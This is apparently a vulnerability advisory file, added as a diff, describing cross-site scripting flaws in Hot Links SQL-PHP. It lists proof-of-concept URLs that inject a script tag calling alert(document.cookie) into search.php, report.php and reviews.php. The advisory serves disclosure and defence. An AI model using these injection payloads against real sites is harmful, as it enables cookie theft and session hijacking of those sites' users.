@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/29632/info
+
+Hot Links SQL-PHP is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks. 
+
+http://www.example.com/path/search.php?search=[XSS] http://www.example.com/path/search.php?search='><script>alert(document.cookie);</script> http://www.example.com/path/report.php?id=[XSS] http://www.example.com/path/report.php?id='><script>alert(document.cookie);</script> http://www.example.com/path/reviews.php?action=review&id==[XSS] http://www.example.com/path/reviews.php?action=review&id='><script>alert(document.cookie);</script> http://www.example.com/path/reviews.php?action=rate&id=[XSS] http://www.example.com/path/reviews.php?action=rate&id='><script>alert(document.cookie);</script>
